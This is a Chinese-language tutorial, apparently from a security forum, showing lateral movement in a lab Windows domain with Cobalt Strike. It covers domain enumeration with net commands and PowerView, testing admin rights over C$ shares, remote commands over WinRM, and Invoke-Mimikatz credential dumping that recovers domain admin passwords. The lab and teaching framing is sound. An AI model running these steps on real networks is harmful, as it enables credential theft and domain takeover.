![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d0379e1c901c5fba0d96a5b90260a7f3c713f30f.watermark%2Ctype_d3f5lxplbmhlaq%2Cshadow_50%2Ctext_q1netibat2nlyw46kq%3D%3D%2Csize_20%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16)

本篇为CS使用系列第六篇文章，主要以一个案例来演示使用CS进行横向移动

域内渗透&amp;横向扩展
=============

网络拓扑
----

![image-20211204103027107](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3e10fd933ca001ba4d7b526b2d57269bcc4c88be.png)

从网络拓扑结构中分析得出

- 客户机win7具有双网卡，与攻击者在同一网段（192）可以直接访问，在现实中就是公网IP
- 客户机win7、成员服务器：Win Server2008-2、域控制器：Win Server2008-1在同一内网（10段），也在同一个域内，可以相互访问

用一个网络拓扑图来展示，可能不是很准确

![image-20211204104630734](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1c86cce74f224a1c5f09938452e34118cffc8b04.png)

在一个用路由器连接的内网中，可以将网络划分为三个区域：安全级别最高的内网；安全级别中等的DMZ；安全级别最低的外网（Internet）

这三个区域负责完成不同的任务，因此需要设置不同的访问策略

**DMZ 称为隔离区**，是为了解决安装防火墙后外部网络不能访问内部网络服务器的问题而设立的一个非安全系统与安全系统之间的缓冲区。DMZ 位于企业内部网络和外部网络之间。可以在DMZ 中放置一些必须公开的服务器设施，例如企业Web 服务器、FTP 服务器和论坛服务器等。DMZ 是对外提供服务的区域，因此可以从外部访问。在网络边界上一般会部署防火墙及入侵检测、入侵防御产品等。如果有Web 应用，还会设置WAF，从而更加有效地保护内网。攻击者如果要进入内网，首先要突破的就是这重重防御。在配置一个拥有DMZ 的网络时，通常需要定义如下访问控制策略，以实现其屏障功能

- 内网可以访问外网：内网用户需要自由地访问外网。在这一策略中，防火墙需要执行NAT
- 内网可以访问DMZ：此策略使内网用户可以使用或者管理DMZ 中的服务器
- 外网不能访问内网：这是防火墙的基本策略。内网中存储的是公司内部数据，显然，这些数据一般是不允许外网用户访问的（如果要访问，就要通过VPN 的方式来进行）
- 外网可以访问DMZ：因为DMZ 中的服务器需要为外界提供服务，所以外网必须可以访问DMZ。同时，需要由防火墙来完成从对外地址到服务器实际地址的转换
- DMZ 不能访问内网：如果不执行此策略，当攻击者攻陷DMZ 时，内网将无法受到保护
- DMZ 不能访问外网：此策略也有例外。例如，在DMZ 中放置了邮件服务器，就要允许访问外网，否则邮件服务器无法正常工作

内网又可以分为办公区和核心区

**办公区**：公司员工日常的工作区，一般会安装防病毒软件、主机入侵检测产品等。办公区一般能够访问DMZ。如果运维人员也在办公区，那么部分主机也能访问核心数据区（很多大企业还会使用堡垒机来统一管理用户的登录行为）。攻击者如果想进入内网，一般会使用鱼叉攻击、水坑攻击，当然还有社会工程学手段。办公区人员多而杂，变动也很频繁，在安全管理上可能存在诸多漏洞，是攻击者进入内网的重要途径之一

**核心区**：存储企业最重要的数据、文档等信息资产，通过日志记录、安全审计等安全措施进行严密的保护，往往只有很少的主机能够访问。从外部是绝难直接访问核心区的。一般来说，能够直接访问核心区的只有运维人员或者IT 部门的主管，所以，攻击者会重点关注这些用户的信息（攻击者在内网中进行横向移动攻击时，会优先查找这些主机）

> 参考：[内网安全攻防：渗透测试实战指南](https://weread.qq.com/web/reader/5d7320b0811e3db9cg01561fk16732dc0161679091c5aeb1)

在开始域内渗透之前，先说明下现在的情况，我们已经通过钓鱼攻击拿到了Victim的Beacon，并且为了尽可能不被内网态势感知防火墙发现，派生SMB Beacon，SMB Beacon 就是为了内网横向扩展渗透而设计的

![image-20211204110236750](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5b86e8446cfe5b163fdc3f1ffe3976c8b5417479.png)

![image-20211204110732311](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c9da3bd9df7ea2a0a4bad7f0937700d557d684ef.png)

环境搭建
----

关于如何搭建域环境在[完整的域渗透实验](https://blog.csdn.net/q20010619/article/details/121588113)中已经介绍的很清楚了，这次这需要添加一个域内用户即可

**配置客户机win7IP地址**

虚拟机win7安装双网络适配器，第二个设置为Lan区段10.0.0.1

![image-20211204101006465](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9eb7db71563c2c393e40661675b63eaf138f7e3e.png)

配置网卡2的IP地址和DNS服务器

![image-20211204100938556](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-31e5d1a459b53c49dfe13b87214cb5b8d83d715f.png)

**加入域**

首先在域控主机上添加用户

![image-20211204101817861](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d18b0ef76c627edb89912c436cd2018688227529.png)

![image-20211204101950474](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-62208bf4caa651bed68c19ec25835f8b2ccd3c67.png)

**win7加入域**

![image-20211204102125397](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e2617cf56d7c0830b1d4516f1526887072b87e8b.png)

设置成功后重启虚拟机，重启后使用域账号登录

**设置winserver2008-2**

真实企业中，因为普通域用户在做一些高级别操作的时候，需要域管理员的账号和密码，有时候用户为了方便就会把普通的域用户增加到目标主机的超级管理员组，所以这里直接把win701用户添加至server2008-2的管理员组

![image-20211205170423779](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-22f2a746aa12131efc731682d29aa946a4cc2413.png)

> 自动添加的方法：[Windows 2008 R2 AD系列一：域用户自动加入本地管理员](https://blog.51cto.com/kusorz/1706174)
> 
> [Windows Server 2012 AD DS环境下域用户自动加入本地管理员组](https://blog.51cto.com/dufei/1657656)

Server2008-2开启winRM

winrm service 默认都是未启用的状态，先查看状态；如无返回信息，则是没有启动；

```bash
winrm enumerate winrm/config/listener
```

针对winrm service 进行基础配置：

```bash
winrm quickconfig
```

![image-20211205183904443](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a42d4d2e4dd470b796f095efde1d78333fb69d9c.png)

1.主机枚举
------

> 当进入目标局域网时，需要弄清楚几个问题
> 
> 1、我正处在那个域上？
> 
> 2、域信任关系是什么样的？
> 
> 3、可以登陆哪些域？这些域上有哪些系统？目标是什么？可以获取什么？
> 
> 4、系统上存放共享数据的地方在哪里？

### Windows 的内置命令

只有收集足够的信息，才能更好的进行下一步操作，在Beacon中可以通过在命令前边加shell的方式执行windows shell命令

```bash
shell whoami
```

![image-20211204111316210](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-47c93e6708f24132aad3b7c16f928f87c6603e30.png)

```bash
shell net user
```

![image-20211204111428691](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e8181cc0e583ac225d292b2f5f31b985e2fee07c.png)

发现是一个域内普通用户，接下来进行**用户枚举**

- 枚举出当前域
    
    ```bash
    shell net view /domain
    ```
    
    ![image-20211204113550627](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6ef5aecae447618a46cfaa20d205636afa338254.png)
    
    如果出现"此工作组的服务器列表当前无法使用"，说明Victim没有关闭防火墙
    
    ![image-20211204112112432](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ce036baee290f92c6565f41ca83f6eb28101f78e.png)
- 枚举域上的主机列表(但不是所有主机，这个也就是在网上邻居中可以看到的内容)
    
    ```bash
    # shell net view /domain:[domain]
    shell net view /domain:OCEAN0
    ```
    
    ![image-20211204113807982](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d94c3afc97b24306d2fa53bc1705717c607f928f.png)
    
    `net group`可以获得加入到这个域中的电脑账户列表
    
    ```bash
    shell net group "domain computers" /domain
    ```
    
    ![image-20211204113911897](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4fb8236e6330e9a081bb10e97342a08fe15293de.png)
- 获取目标主机IP
    
    ```bash
    shell ping NetBIOSName
    ```
    
    ![image-20211204114146596](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4ab34de88d00bb5ac77b6e4900b18b88c316545a.png)
    
    通过nslookup命令
    
    ```bash
    shell nslookup NetBIOSName
    ```
    
    ![image-20211204114918512](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8b309e16349862cb07d7e921696114a745cb12bd.png)
- 查看域控
    
    ```bash
    shell nltest /dclist:[domain]
    
    # 当使用 32 位的 payload 运行在 64 位的系统上，并且 nltest 路径不对的时候，可能会提示没有 nltest 这个命令，这时可以尝试使用下面的命令为其指定路径
    shell C:\windows\sysnative\nltest /dclist:[domain]
    ```
    
    ![image-20211205132806284](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c8d5264085907f2745b20e52e2e4c4f8ab3b1c64.png)
- 查看信任关系
    
    ```bash
    shell nltest /domain_trusts
    ```
    
    ![image-20211205132745796](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7835f90b00dfe0233110236fd79d5f7d2b8b6a91.png)
- 列出主机共享列表
    
    ```bash
    shell net view \\[name]
    
    # name可以用获取域内注解列表命令得到
    shell net view /domain:OCEAN0
    ```
    
    ![image-20211205133041665](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b1a270cc0e05cc8c2bff6424d4ff3b69c72bea3a.png)

### PowerView

在渗透进入内网后，如果直接使用 Windows 的内置命令，比如 `net view、net user`等，可能就会被管理人员或者各种安全监控设备所发现。因此较为安全的办法就是使用 Powershell 和 VMI 来进行躲避态势感知的检测

PowerView 是由 Will Schroeder 开发的 PowerShell 脚本，该脚本完全依赖于 Powershell 和 VMI ，使用 PowerView 可以更好的收集内网中的信息，在使用之前，与 PowerUp 的一样需要先 import 导入 ps1 文件

> PowerView 下载地址：<https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon>

使用命令导入脚本

```bash
powershell-import
```

导入文件后就可以执行命令（需要在前边加上powershell）

- 查询本地域的信息
    
    ```bash
    powershell Get-NetDomain
    ```
    
    ![image-20211205135540293](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c465bf3f7914f2cb2a209a92f689787b2ef8b5f4.png)
- 查看是否存在网络共享
    
    ```bash
    powershell Invoke-ShareFinder
    ```
    
    ![image-20211205135652380](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2bb3b15f0e5144963b43874ce591d1bb61c17ef6.png)
- 查看域信任关系
    
    ```bash
    powershell Invoke-MapDomainTrust
    ```
    
    没有有用的信息

### CS net模块

Cobalt Strike 中有自己的 net 模块，net 模块是 beacon 后渗透攻击模块，它通过 windows 的网络管理 api 函数来执行命令，想使用 net 命令，只需要在 beacon 的控制中心输入 net + 要执行的命令即可

```bash
net dclist : 列出当前域的域控制器
net dclist [DOMAIN] : 列出指定域的域控制器
net share \\[name] : 列出目标的共享列表
net view : 列出当前域的主机
net view [DOMAIN] : 列出指定域的主机
```

在 beacon 控制台中输入这些命令很类似输入一个本地的 net 命令，但相比于主机上运行 Beacon 中输出的结果更加丰富

![image-20211205140406148](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-59361792d9201606f8ae01ff181e828e2aed8297.png)

2.用户枚举
------

> 用户枚举的三个关键步骤：
> 
> 1、当前账号是否为管理员账号？
> 
> 2、哪些账号是域管理员账号？
> 
> 3、哪个账号是这个系统上的本地管理员账号？

### 1.判断当前账号是否为管理员账号

因为普通域用户在做一些高级别操作的时候，需要域管理员的账号和密码，有时候用户为了方便就会把普通的域用户增加到目标主机的超级管理员组，所以为了快速拿到权限可以先判断当前账号是否为管理员账号

可以尝试运行一些只有管理员账号才有权限操作的命令，然后通过返回结果判断是否为管理员，其中一种方式是尝试列出仅仅只有管理员才能查看的共享列表，比如下面的 `dir \\host\C$` 命令，如果可以看到一个文件列表，那么说明可能拥有本地管理员权限

```bash
shell dir \\host\C$
```

通过之前shell命令，已经知道`WIN-A9PLNLID2QM`为域控主机，那么这就是host

```bash
shell dir \\WIN-A9PLNLID2QM\C$
```

发现账户权限不够拒绝访问，所以现在的权限不是域管理员

![image-20211205141748245](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b866e99661e98eae70483d879287fa2359c362b4.png)

尝试访问本地目录，发现可以列出目录，判断当前权限为**本地管理员**

```bash
shell dir \\win701\C$
```

\[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-ZMo1U2ab-1638702777912)([https://gitee.com/q\_one/oceanpic/raw/master/img20212/202112051912171.png](https://gitee.com/q_one/oceanpic/raw/master/img20212/202112051912171.png))\]

使用同样方法查看其他主机

```powershell
shell dir \\SERVER20082\C$
```

发现该域账号同时使server20082的本地管理员，也就是说可以利用server20082作为跳板机

![image-20211205170751674](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a113c689703dd30d4824bfc915a6b56c2be8f97c.png)

也可以运行其他命令，比如运行下面的 `at` 命令来查看系统上的计划任务列表，如果显示出了任务列表信息，那么可能是本地管理员。（当任务列表没有信息时会返回 “列表是空的” 提示）

```powershell
shell at \\host
```

**powerview**

在加载 `PowerView` 后可以用powerview中的方法

```powershell
powershell Find-LocalAdminAccess
```

### 2.判断哪些账号是域管理员账号

**win命令**

可以在共享里使用本地的Windows命令，找出这些“域群组”的成员

```bash
shell net group "enterprise admins" /DOMAIN
shell net group "domain admins" /DOMAIN
```

运行下面的命令来看谁是域控制器上的管理员

```powershell
shell net localgroup "administrators" /domain
```

![image-20211205151151997](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5a20c6cb3ccba77e986c20c85c73c88b23c389c1.png)

**Net 模块**

下面的命令中 `TARGET` 的意思是一个域控制器或者是任何想查看的组名，比如企业管理员、域管理员等等

```powershell
net group \\TARGET group name
```

也可以运行下面的命令，这会连接任意目标来获取列表

```powershell
net localgroup \\TARGET group name
```

**powerview**

```bash
powershell Get-NetLocalGroup -HostName Target
```

### 3.判断本地管理员

本地管理员可能是一个域账户，因此如果想把一个系统作为目标，应该找到谁是这个系统的本地管理员，因为如果获得了它的密码哈希值或者凭据就可以伪装成那个用户

**Net模块**

beacon 的 net 模块可以在系统上从一个没有特权的关联中查询本地组和用户

在 beacon 控制台中运行下面命令可以获得一个目标上的群组列表

```powershell
net localgroup \\TARGET
```

如果想获取群组的列表，可运行下面的命令来获得一个群组成员的名单列表。

```powershell
net localgroup \\TARGET group name
```

**PowerView 模块**

PowerView 使用下面的命令能够在一个主机上找到本地管理员，这条命令实际上通过管理员群组找到同样的群组并且把成员名单返回出来

```powershell
Get-Netlocalgroup -hostname TARGET
```

3.利用
----

如果一个系统信任我们为本地管理员权限，无需恶意软件就可以进行以下操作（适用于域用户为其他域成员服务器的本地管理员的情况）

### 文件操作

- **查看共享文件**
    
    ```bash
    shell dir \\host\C$\foo
    ```
- **复制文件**
    
    ```powershell
    shell copy \\host\C$\foo\secrets.txt
    ```
- **查看文件列表**
    
    ```powershell
    shell dir /S /B \\host\C$
    # 其中 /S 表示列出指定目录及子目录所有文件，/B 表示使用空格式，即没有标题或摘要信息
    ```

### 使用WinRM运行命令

WinRM 运行在 5985 端口上，WinRM 是 Windows 远程管理服务，使用 WinRM 可以使远程管理更容易一些

如果想利用 WinRM 运行命令则可以使用下面的命令

```bash
powershell Invoke-Command -ComputerName TARGET -ScriptBlock {command here}

# powershell Invoke-Command -ComputerName SERVER20082 -ScriptBlock {net localgroup administrators}
```

![image-20211205184000337](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6f2f469dda92cf05b36d5bc71988e3f7c649e6e3.png)

> 注：如果命令运行失败可能是因为 WinRM 配置原因，可在 powershell 环境下运行 `winrm quickconfig`命令，输入 `y` 回车即可

命令运行后的结果，WinRM 也将通过命令行进行显示，因此可以使用 Powershell 的 Invoke 命令来作为远程工具，而不使用其他的恶意软件来控制系统

### Powersploit运行mimikatz

使用 PowerSploit 来通过 WinRM 运行 Mimikatz，只需要先导入 Invoke-Mimikatz.ps1 文件，再执行以下命令即可

```bash
powershell-import /path/to/Invoke-Mimikatz.ps1
powershell Invoke-Mimikatz -ComputerName TARGET
```

> 注：之前提了很多次的 PowerView 也是 PowerSploit 项目里众多 ps1 文件之一，Mimikatz 的 ps1 文件在 PowerSploit 项目的 Exfiltration 目录下

因为 beacon 上传文件大小限制在1MB，而 Invoke-Mimikatz.ps1 文件大小在 2 MB 多(有600K的版本)，因此直接运行 `powershell-import` 导入该文件会报错，这里可以选择使用 beacon 中的 upload 命令或者在当前会话的 File Browser 图形界面中上传该文件

```powershell
upload C:\path\Invoke-Mimikatz.ps1
```

上传之后通过 dir 命令可以查看到文件被上传到了C盘下，之后可以运行以下命令来导入该文件

```powershell
powershell import-module C:\Invoke-Mimikatz.ps1
```

最后再运行以下命令就能通过 WinRM 执行 Mimikatz 了

```powershell
powershell Invoke-Mimikatz -ComputerName TARGET
```

如果提示：`无法将“Invoke-Mimikatz”项识别为 cmdlet、函数……`，则可以将两条命令以分号合并在一起运行，即：

```bash
# beacon> powershell import-module C:\Invoke-Mimikatz.ps1 ; Invoke-Mimikatz -ComputerName SERVER20082
beacon> powershell import-module C:\Users\win701\Desktop\Invoke-Mimikatz.ps1 ; Invoke-Mimikatz -ComputerName TARGET
```

![image-20211205184229908](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f0d8de46b946c657fb84f7190651f5af43b81e72.png)

这样的话就拿到了Server2008-2的账密，以及域控超级管理员账号和密码，如果域控开启了3389就可以直接远程连接

![image-20211205185443240](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ec7c35e8fa12d2f1133ad59452e4d8fe04bac6e5.png)

实验中导致横向移动原因是因为存在域普通用户作为本地超级管理员的情况，企业应避免使用这种不安全的权限分配  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-82c219c1cfd6b85e7dfb18ecf4ae1ef92157deb5.watermark%2Ctype_d3f5lxplbmhlaq%2Cshadow_50%2Ctext_q1netibat2nlyw46kq%3D%3D%2Csize_20%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16)